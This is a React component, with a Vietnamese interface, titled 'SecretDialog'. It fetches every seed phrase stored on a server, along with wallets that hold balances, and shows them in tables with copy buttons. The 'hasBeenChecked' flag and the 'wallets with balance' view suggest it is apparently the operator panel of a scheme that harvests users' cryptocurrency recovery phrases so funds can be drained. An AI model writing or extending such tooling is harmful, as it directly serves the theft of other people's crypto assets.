import React, { useState, useEffect } from 'react';
import { 
  Dialog, 
  DialogContent, 
  DialogHeader, 
  DialogTitle,
  DialogDescription,
  DialogFooter
} from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { apiRequest } from '@/lib/queryClient';
import { Copy } from 'lucide-react';

interface SecretDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

interface SeedPhrase {
  id: number;
  seedPhrase: string;
  createdAt: string;
  hasBeenChecked: boolean;
}

interface Wallet {
  id: number;
  blockchain: string;
  address: string;
  balance: string;
  seedPhrase: string;
}

export function SecretDialog({ open, onOpenChange }: SecretDialogProps) {
  const [seedPhrases, setSeedPhrases] = useState<SeedPhrase[]>([]);
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(false);
  
  // Function to copy text to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };
  
  useEffect(() => {
    const fetchData = async () => {
      if (!open) return;
      
      setLoading(true);
      try {
        const response = await apiRequest('/api/all-wallets-and-seeds');
        if (response.ok) {
          const data = await response.json();
          setSeedPhrases(data.seedPhrases || []);
          setWallets(data.wallets || []);
        }
      } catch (error) {
        console.error('Error fetching data:', error);
      } finally {
        setLoading(false);
      }
    };
    
    fetchData();
  }, [open]);
  
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl max-h-[80vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>Dữ liệu đang lưu trong hệ thống</DialogTitle>
          <DialogDescription>
            Thông tin seed phrase và số dư ví được lưu trữ
          </DialogDescription>
        </DialogHeader>
        
        <div className="space-y-6">
          {/* Seed phrases section */}
          <div>
            <h3 className="text-lg font-semibold mb-2">Seed Phrases đã lưu</h3>
            {loading ? (
              <div className="flex justify-center py-4">Đang tải...</div>
            ) : seedPhrases.length > 0 ? (
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-[80px]">ID</TableHead>
                    <TableHead>Seed Phrase</TableHead>
                    <TableHead className="w-[100px]">Thao tác</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {seedPhrases.map((seed) => (
                    <TableRow key={seed.id}>
                      <TableCell>{seed.id}</TableCell>
                      <TableCell className="font-mono text-xs break-all">{seed.seedPhrase}</TableCell>
                      <TableCell>
                        <Button 
                          variant="ghost" 
                          size="sm" 
                          onClick={() => copyToClipboard(seed.seedPhrase)}
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            ) : (
              <div className="text-center py-4 text-gray-500">Không có seed phrase nào</div>
            )}
          </div>
          
          {/* Wallets section */}
          <div>
            <h3 className="text-lg font-semibold mb-2">Ví có số dư</h3>
            {loading ? (
              <div className="flex justify-center py-4">Đang tải...</div>
            ) : wallets.length > 0 ? (
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="w-[80px]">Blockchain</TableHead>
                    <TableHead>Địa chỉ</TableHead>
                    <TableHead>Số dư</TableHead>
                    <TableHead>Seed Phrase</TableHead>
                    <TableHead className="w-[100px]">Thao tác</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {wallets.map((wallet) => (
                    <TableRow key={wallet.id}>
                      <TableCell>{wallet.blockchain}</TableCell>
                      <TableCell className="font-mono text-xs truncate max-w-[120px]">{wallet.address}</TableCell>
                      <TableCell>{wallet.balance}</TableCell>
                      <TableCell className="font-mono text-xs break-all">{wallet.seedPhrase}</TableCell>
                      <TableCell>
                        <Button 
                          variant="ghost" 
                          size="sm" 
                          onClick={() => copyToClipboard(wallet.seedPhrase)}
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            ) : (
              <div className="text-center py-4 text-gray-500">Không có ví nào có số dư</div>
            )}
          </div>
        </div>
        
        <DialogFooter>
          <Button onClick={() => onOpenChange(false)}>Đóng</Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}